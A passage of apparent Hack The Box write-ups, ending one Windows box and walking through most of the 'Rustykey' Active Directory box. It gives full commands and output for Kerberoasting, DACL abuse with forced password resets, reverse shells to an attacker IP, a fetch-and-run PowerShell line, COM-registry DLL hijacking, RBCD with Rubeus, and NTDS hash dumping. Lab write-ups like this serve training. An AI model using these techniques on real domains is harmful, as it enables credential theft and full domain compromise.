go into the second and see a archived directory. This holds the Users Directory which we have access to ours. We can from this, gather the keys we need for DPAPI. \n\nExfiltrating the keys via smb didn't work, Base64 encoding and then decrypting on attacker machine.\n\n```\nkonoha# impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[MASTERKEYFILE]\nVersion     :        2 (2)\nGuid        : 08949382-134f-4c63-b93c-ce52efc0aa88\nFlags       :        0 (0)\nPolicy      :        0 (0)\nMasterKeyLen: 00000088 (136)\nBackupKeyLen: 00000068 (104)\nCredHistLen : 00000000 (0)\nDomainKeyLen: 00000174 (372)\n\nDecrypted key with User Key (MD4 protected)\nDecrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83\nkonoha# impacket-dpapi credential -f 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[CREDENTIAL]\nLastWritten : 2025-01-29 12:55:19+00:00\nFlags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)\nPersist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)\nType        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)\nTarget      : Domain:target=Jezzas_Account\nDescription :\nUnknown     :\nUsername    : jeremy.combs\nUnknown     : qT3V9pLXyN7W4m\n```\nAfter getting credentials we again get a shell like we did before.\n```\n*Evil-WinRM* PS C:\\programdata> .\\RCs.exe jeremy.combs qT3V9pLXyN7W4m powershell -r 10.10.14.2:443 -t 0\n[*] Warning: The logon for user 'jeremy.combs' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.\n\n[+] Running in session 0 with process function CreateProcessWithLogonW()\n[+] Using Station\\Desktop: Service-0x0-e18972$\\Default\n[+] Async process 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' with pid 3564 created in background.\n```\n## Backing it up\nNow going in to IT again we have the Third directory. Which contains backups, SECURITY, SYSTEM, and if we go into the Active Directory folder we find the ntds.dit. With all these transferred to our machine we can decode and get the Administrator hash.\n\n```\nkonoha# impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d\n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC\n$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77\n[*] DPAPI_SYSTEM\ndpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436\ndpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3\n[*] NL$KM\n 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...\n 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7\n 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..\n 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....\nNL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40\n[*] Reading and decrypting hashes from ntds.dit\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n<SNIP>\n```\n![](/img/robocop.gif)","tags":["Deleted Users Accounts","DPAPI"],"categories":["htb"]},{"title":"Rustykey (Windows Hard)","url":"/2025/06/30/Rustykey/","content":"\n![](/img/rustykey.png)\n\n\nThis Windows Hard box starts off assumed breach. While enumerating with the credentials you find that NTLM is disabled. Using your credentials you're able to obtain a kerberos ticket that lets you get a bloodhound dump and further enumerate the machine. Once done, you're able to kerberoast SPNs(Some did timeroast) and obtain some hashes, which one of them cracks to cleartext for *IT-Computer3$*. Using your new found credentials you're able to abuse DACLs that allows our user to remove objects from the *Protected Objects* group. Thus allowing for *ForceChangePassword* and after successfully changing the password for **bb.morgan**, we are able to get a kerberos ticket, setup our krb5.conf and evil-winrm onto the box. \n\nEnumeration as **bb.morgan** shows very little, yet we had a user **ee.reed** in the *Support* group. After changing his password, creating a reverse shell and using *RunasCs.exe*, we're able to get a shell as **ee.reed**. Using *PrivescCheck.ps1* shows us a *COM Registry* component we have *FullAccess* over. Abusing this gets us a reverse shell as **mm.turner**. Looking back in bloodhound we see that **mm.turner** is apart of the *DelegationManagers* group. This allows us to *AddAllowedToAct* on the domain. Once we add the attribute, we use *Rubeus.exe* and perform Resource-Based Constrained Delegation. This gets us a TGS which we then can use to *secretsdump* the domain.\n\n*As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A*\n\n## Initial Nmap\n\n```bash\nPORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-29 04:15:29Z)\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 127\n464/tcp   open  kpasswd5?     syn-ack ttl 127\n593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack ttl 127\n3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 127\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing\n47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| p2p-conficker:\n|   Checking for Conficker.C or higher...\n|   Check 1 (port 51928/tcp): CLEAN (Couldn't connect)\n|   Check 2 (port 27628/tcp): CLEAN (Couldn't connect)\n|   Check 3 (port 63867/udp): CLEAN (Timeout)\n|   Check 4 (port 46581/udp): CLEAN (Failed to receive data)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time:\n|   date: 2025-06-29T04:16:24\n|_  start_date: N/A\n|_clock-skew: 0s\n```\n\nMany ports open, but we can gather the domain name from it being *rustykey.htb*.\n\n## Enum of rr.parker\n\nWith his creds I simply grabbed a TGT for him since NTLM is disabled and exported it for use.\n```bash\nkonoha# impacket-getTGT 'rustykey.htb/rr.parker:8#t5HE8L!W3A' -dc-ip 10.10.11.75\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Saving ticket in rr.parker.ccache\nkonoha# export KRB5CCNAME=./rr.parker.ccache\n```\n\nSMB didn't let us authenticate, but LDAP worked so we can get a bloodhound dump.\n```bash\nkonoha# nxc smb 10.10.11.75 -d rustykey.htb -k --use-kcache\nSMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         10.10.11.75     445    10.10.11.75      [-] rustykey.htb\\ from ccache KDC_ERR_S_PRINCIPAL_UNKNOWN\nkonoha# nxc ldap 10.10.11.75 -d rustykey.htb -k --use-kcache\nLDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)\nLDAP        10.10.11.75     389    DC               [+] rustykey.htb\\rr.parker from ccache\n\nkonoha# bloodhound-python -d rustykey.htb -u 'rr.parker' -k -no-pass -ns 10.10.11.75 --zip -c Group,LocalAdmin,Session,Trusts,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL\n<SNIP>\nINFO: Done in 00M 10S\nINFO: Compressing output into 20250701022158_bloodhound.zip\n```\n\n## No way out so it seemed!!\n\nAfter loading up the data, we didn't find much on our user. Never the less, we have credentials we can get a list of users and try kerberoasting.\n```bash\nkonoha# nxc ldap 10.10.11.75 -d rustykey.htb -k --use-kcache --users --computers\nLDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)\nLDAP        10.10.11.75     389    DC               [+] rustykey.htb\\rr.parker from ccache\nLDAP        10.10.11.75     389    DC               [*] Skipping disabled account: krbtgt\nLDAP        10.10.11.75     389    DC               [*] Total of records returned 0\nLDAP        10.10.11.75     389    DC               [*] Enumerated 11 domain users: rustykey.htb\nLDAP        10.10.11.75     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-\nLDAP        10.10.11.75     389    DC               Administrator                 2025-06-04 17:52:22 0        Built-in account for administering the computer/domain\nLDAP        10.10.11.75     389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain\nLDAP        10.10.11.75     389    DC               krbtgt                        2024-12-26 18:53:40 0        Key Distribution Center Service Account\nLDAP        10.10.11.75     389    DC               rr.parker                     2025-06-04 17:54:15 0\nLDAP        10.10.11.75     389    DC               mm.turner                     2024-12-27 04:18:39 0\nLDAP        10.10.11.75     389    DC               bb.morgan                     2025-07-01 02:16:40 0\nLDAP        10.10.11.75     389    DC               gg.anderson                   2025-07-01 02:16:40 0\nLDAP        10.10.11.75     389    DC               dd.ali                        2025-07-01 02:16:40 0\nLDAP        10.10.11.75     389    DC               ee.reed                       2025-07-01 02:16:40 0\nLDAP        10.10.11.75     389    DC               nn.marcos                     2024-12-27 05:34:50 0\nLDAP        10.10.11.75     389    DC               backupadmin                   2024-12-29 18:30:18 11\nLDAP        10.10.11.75     389    DC               [*] Total records returned: 16\nLDAP        10.10.11.75     389    DC               DC$\nLDAP        10.10.11.75     389    DC               Support-Computer1$\nLDAP        10.10.11.75     389    DC               Support-Computer2$\nLDAP        10.10.11.75     389    DC               Support-Computer3$\nLDAP        10.10.11.75     389    DC               Support-Computer4$\nLDAP        10.10.11.75     389    DC               Support-Computer5$\nLDAP        10.10.11.75     389    DC               Finance-Computer1$\nLDAP        10.10.11.75     389    DC               Finance-Computer2$\nLDAP        10.10.11.75     389    DC               Finance-Computer3$\nLDAP        10.10.11.75     389    DC               Finance-Computer4$\nLDAP        10.10.11.75     389    DC               Finance-Computer5$\nLDAP        10.10.11.75     389    DC               IT-Computer1$\nLDAP        10.10.11.75     389    DC               IT-Computer2$\nLDAP        10.10.11.75     389    DC               IT-Computer3$\nLDAP        10.10.11.75     389    DC               IT-Computer4$\nLDAP        10.10.11.75     389    DC               IT-Computer5$\n```\n\nLets make a list and try all these users and computers.\n```bash\nkonoha# impacket-GetUserSPNs -dc-ip 10.10.11.75 'rustykey.htb/rr.parker' -usersfile user.lst -k -no-pass\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n$krb5tgs$23$*krbtgt$RUSTYKEY.HTB$krbtgt*$172f44f5c03cb0964a08add4f0727799$<SNIP>\n[-] Principal: rr.parker - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n[-] Principal: mm.turner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n[-] Principal: bb.morgan - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n[-] Principal: gg.anderson - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n[-] Principal: dd.ali - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n[-] Principal: ee.reed - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n[-] Principal: nn.marcos - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n[-] Principal: backupadmin - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)\n$krb5tgs$23$*DC$$RUSTYKEY.HTB$DC$*$7664306543510d4896b1e31f823a0256$<SNIP>\n<SNIP>\n```\n\nThis returns many hashes that we can try to crack offline. When we do we get one that cracks.\n\n```bash\nkonoha# hashcat HASHES --show\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\n$krb5tgs$23$*IT-Computer3$$RUSTYKEY.HTB$IT-Computer3$*$1424a46c534b22e4a188835b00461505$8ebe6eacca6940cec84b7fd9a6<SNIP>:<SNIP>\n```\n\n![](/img/bingo.gif)\n\nWe now have new credentials to *IT-Computer3$*. We can look back at Bloodhound and see what permissions we have and looking as we have some interesting ones, we can start there. \n\n![](/img/rustykeybh.png)\n\nFrom this we have the following:\n\n- **AddSelf**\n    - HelpDesk\n- **ForceChangePassword**\n    - bb.morgan\n    - ee.reed\n    - gg.anderson\n        - **GenericWrite**\n            - dd.ali\n- **AddMember**\n    - Protected Objects\n\nSo we can add ourselves to *HelpDesk* group and then we can remove the *IT* and *Support* groups from the *Protected Objects* group. This will let us change the passwords for these users and requests TGTs for them. I created a little script that lets me do all this at once.\n\n*Error states the entry already exists, as the comptuer already has been added to the HelpDesk group already*\n```bash\nkonoha# ./runRCE.sh\nRetriving TGT\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Saving ticket in IT-Computer3$.ccache\nExporting Ticket\nAdding Computer to Helpdesk\n[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&dc=10.10.11.75\n[*] Trying to connect to DC.rustykey.htb...\n[+] Connection successful\nTraceback (most recent call last):\n  File \"/root/.local/bin/bloodyAD\", line 8, in <module>\n    sys.exit(main())\n             ~~~~^^\n  File \"/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py\", line 210, in main\n    output = args.func(conn, **params)\n  File \"/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py\", line 252, in groupMember\n    conn.ldap.bloodymodify(group, {\"member\": [(Change.ADD.value, member_transformed)]})\n    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py\", line 301, in bloodymodify\n    raise err\nmsldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=HelpDesk,CN=Users,DC=rustykey,DC=htb! Result code: \"entryAlreadyExists\" Reason: \"b'00000562: UpdErr: DSID-031A11DA, problem 6005 (ENTRY_EXISTS), data 0\\n\\x00'\"\nRemoving Support and IT from Protected Objects\n[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&dc=10.10.11.75\n[*] Trying to connect to DC.rustykey.htb...\n[+] Connection successful\n[-] CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB\n[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&dc=10.10.11.75\n[*] Trying to connect to DC.rustykey.htb...\n[+] Connection successful\n[-] CN=SUPPORT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB\nSetting Password:P@ssw0rd123! for ee.reed,bb.morgan,gg.anderson. Grab a TGT afterwards.\n[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&dc=10.10.11.75\n[*] Trying to connect to DC.rustykey.htb...\n[+] Connection successful\n[+] Password changed successfully!\n[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&dc=10.10.11.75\n[*] Trying to connect to DC.rustykey.htb...\n[+] Connection successful\n[+] Password changed successfully!\n[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&dc=10.10.11.75\n[*] Trying to connect to DC.rustykey.htb...\n[+] Connection successful\n[+] Password changed successfully!\n```\n![](/img/goldeneye-boris.gif)\n\nNow we can request a TGT and try to get on the box seeing how most of the users are in the *Remote Management* group. Yet, if we look at the attributes set for *gg.anderson*, their account is disabled and we have no way of removing that User Account Control.  \n```bash\nuSNCreated: 20637\nuserAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD\nuserPrincipalName: gg.anderson@rustykey.htb\n```\nSo for *ee.reed* and *dd.ali*, even getting a TGT won't allow us to log in. The only ticket to work was *bb.morgan*.\n\n## Foothold with bb.morgan\n\nOnce we have the correct *krb5.conf* we can get on the box. You can use *nxc* to generate a krb file as well with this TGT.\n```bash\nkonoha# nxc smb DC.rustykey.htb -d rustykey.htb -k --use-kcache --generate-krb5-file rustykey.conf\nSMB         DC.rustykey.htb 445    DC               [*]  x64 (name:DC) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.rustykey.htb 445    DC               [+] rustykey.htb\\bb.morgan from ccache\nkonoha# cat rustykey.conf\n\n[libdefaults]\n    dns_lookup_kdc = false\n    dns_lookup_realm = false\n    default_realm = RUSTYKEY.HTB\n\n[realms]\n    RUSTYKEY.HTB = {\n        kdc = dc.rustykey.htb\n        admin_server = dc.rustykey.htb\n        default_domain = rustykey.htb\n    }\n\n[domain_realm]\n    .rustykey.htb = RUSTYKEY.HTB\n    rustykey.htb = RUSTYKEY.HTB\n```\nOnce do we can WinRM onto the box. \n\nInitially, our enumeration doesn't find anything other then a *7-Zip* directory in *Program Files*, we'll come back to that and move on to the users we have the ability to change the password of. Looking at all the users we have, *ee.reed* is in the *Support* group. We can laterally move to him and see what kind of permissions he has. \n\n```powershell\n*Evil-WinRM* PS C:\\programdata> .\\RCs.exe ee.reed P@ssw0rd123! \"C:\\ProgramData\\a.exe\" -t 0\n[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.\n[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.\n\n[+] Running in session 0 with process function CreateProcessWithLogonW()\n[+] Using Station\\Desktop: Service-0x0-6658a90$\\Default\n[+] Async process 'C:\\ProgramData\\a.exe' with pid 13996 created in background.\n*Evil-WinRM* PS C:\\programdata>\n\n-----\n\nkonoha# rlwrap -cAr nc -lvnp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.75] 52766\nMicrosoft Windows [Version 10.0.17763.7434]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nwhoami\nrustykey\\ee.reed\n```\n\n## Shell as ee.reed\n\nStarting with enumeration again,this time using *PrivescCheck.ps1* we find a **COM Registry**.\n\n```powershell\nPS C:\\Windows\\system32> iwr http://10.10.14.7:81/PrivescCheck.ps1 -UseBasicParsing | iex\niwr http://10.10.14.7:81/PrivescCheck.ps1 -UseBasicParsing | iex\nPS C:\\Windows\\system32> Invoke-PrivescCheck\n<SNIP>\n????????????????????????????????????????????????????????????????\n? CATEGORY ? TA0004 - Privilege Escalation                     ?\n? NAME     ? COM server registry permissions                   ?\n? TYPE     ? Base                                              ?\n????????????????????????????????????????????????????????????????\n? Check whether the current user has any modification rights   ?\n? on a COM server in the registry. This may not necessarily    ?\n? result in a privilege escalation. Further analysis is        ?\n? required.                                                    ?\n????????????????????????????????????????????????????????????????\n<SNIP>\nId                : 23170f69-40c1-278a-1000-000100020000\nName              : 7-Zip Shell Extension\nRegPath           : HKLM\\SOFTWARE\\Classes\\CLSID\\{23170f69-40c1-278a-1000-000100020000}\nHandlerType       : InprocServer32\nFTWARE\\Classes\\CLSID\\{23170f69-40c1-278a-1000-000100020000}\\InprocServer32\nHandlerDataType   : FilePath\nHandlerData       : C:\\Program Files\\7-Zip\\7-zip.dll\nModifiablePath    : HKLM\\SOFTWARE\\Classes\\CLSID\\{23170f69-40c1-278a-1000-000100020000}\\InprocServer32\nIdentityReference : RUSTYKEY\\Support (S-1-5-21-3316070415-896458127-4139322052-1132)\nPermissions       : AllAccess\n```\n\n![](/img/great.gif)\n\nFunny enough this was seen when we had a session as *bb.morgan*. We have AllAccess so we can use some classic DLL hijacking and replace this value within registry. After creating a simple dll using *msfvenom* we can upload it, setup a listener and edit the value.. \n\n```powershell\nPS C:\\Windows\\system32> reg add \"HKLM\\SOFTWARE\\Classes\\CLSID\\{23170f69-40c1-278a-1000-000100020000}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\ProgramData\\a.dll\"\nreg add \"HKLM\\SOFTWARE\\Classes\\CLSID\\{23170f69-40c1-278a-1000-000100020000}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\ProgramData\\a.dll\"\nValue  exists, overwrite(Yes/No)? Yes\nThe operation completed successfully.\nPS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Classes\\CLSID\\{23170f69-40c1-278a-1000-000100020000}\\\" /ve /s\nreg query \"HKLM\\SOFTWARE\\Classes\\CLSID\\{23170f69-40c1-278a-1000-000100020000}\\\" /ve /s\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{23170f69-40c1-278a-1000-000100020000}\n    (Default)    REG_SZ    7-Zip Shell Extension\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{23170f69-40c1-278a-1000-000100020000}\\InprocServer32\n    (Default)    REG_SZ    C:\\ProgramData\\a.dll\n```\n\nWaiting a minute or two results in getting a shell as *mm.turner*.\n```powershell\nkonoha# rlwrap -cAr nc -lvnp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.75] 52428\nMicrosoft Windows [Version 10.0.17763.7434]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows>whoami\nwhoami\nrustykey\\mm.turner\n```\n\n## Shell as mm.turner \n\nInteresting, we now have a shell as *mm.turner*, and if we look back at Bloodhound we see he's apart of *DelegationManagers*. That being said, we have *AddAllowedToAct* to the DC$. So essentially here we have **RBCD**(Resource-Based Constrained Delegation). This [article](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) helps explain the theory, yet what we need to do is set the attribute `PrincipalsAllowedToDelegateToAccount` on the DC$ to allow for the computer account we control (IT-Computer3$), and then impersonate and high level user. Using S4U2Self+S4U2proxy we're able to get a TGS and then use that to authenticate to the DC$. As *mm.turner*, we can set the attribute for the DC$, then for the rbcd we will be using *Rubeus.exe*.\n\n### Mom said I'm allowed too Privesc!! \n\n![](/img/youcantdothat.gif)\n\nLet's go ahead a get the TGS as *backupadmin* and then we can *secretsdump*.\n\n```powershell\nPS C:\\ProgramData> $targetComputer = \"CN=DC,OU=DOMAIN CONTROLLERS,DC=RUSTYKEY,DC=HTB\"\n$targetComputer = \"CN=DC,OU=DOMAIN CONTROLLERS,DC=RUSTYKEY,DC=HTB\"\nPS C:\\ProgramData> Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount \"CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb\"\nSet-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount \"CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb\"\nPS C:\\ProgramData> .\\Rub.exe hash /domain:rustykey.htb /user:IT-Computer3$ /password:<SNIP>\n.\\Rub.exe hash /domain:rustykey.htb /user:IT-Computer3$ /password:<SNIP>\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0\n\n\n[*] Action: Calculate Password Hash(es)\n\n[*] Input password             : <SNIP>\n[*] Input username             : IT-Computer3$\n[*] Input domain               : rustykey.htb\n[*] Salt                       : RUSTYKEY.HTBhostit-computer3.rustykey.htb\n[*]       rc4_hmac             : <SNIP>\n[*]       aes128_cts_hmac_sha1 : <SNIP>\n[*]       aes256_cts_hmac_sha1 : <SNIP>\n[*]       des_cbc_md5          : <SNIP>\n\nPS C:\\ProgramData>./Rub.exe s4u /nowrap /impersonateuser:backupadmin /domain:rustykey.htb /user:IT-Computer3$ /password:<SNIP> /rc4:<SNIP>  /msdsspn:host/dc.rustykey.htb /ptt\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0\n\n[*] Action: S4U\n\n[*] Using rc4_hmac hash: <SNIP>\n[*] Building AS-REQ (w/ preauth) for: 'rustykey.htb\\IT-Computer3$'\n[*] Using domain controller: fe80::bd5e:24aa:d271:1fea%11:88\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n      doIFmDCCBZSgAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoQ4bDFJVU1RZS0VZLkhUQqIhMB\n                                        <SNIP>\n\n\n[*] Action: S4U\n\n[*] Building S4U2self request for: 'IT-Computer3$@RUSTYKEY.HTB'\n[*] Using domain controller: dc.rustykey.htb (fe80::bd5e:24aa:d271:1fea%11)\n[*] Sending S4U2self request to fe80::bd5e:24aa:d271:1fea%11:88\n[+] S4U2self success!\n[*] Got a TGS for 'backupadmin' to 'IT-Computer3$@RUSTYKEY.HTB'\n[*] base64(ticket.kirbi):\n\n      doIFtjCCBbKgAwIBBaEDAgEWooIEzzCCBMthggTHMIIEw6ADAgEFoQ4bDFJVU1RZS0VZLkhUQqIaMB\n                                        <SNIP>\n\n[*] Impersonating user 'backupadmin' to target SPN 'host/dc.rustykey.htb'\n[*] Building 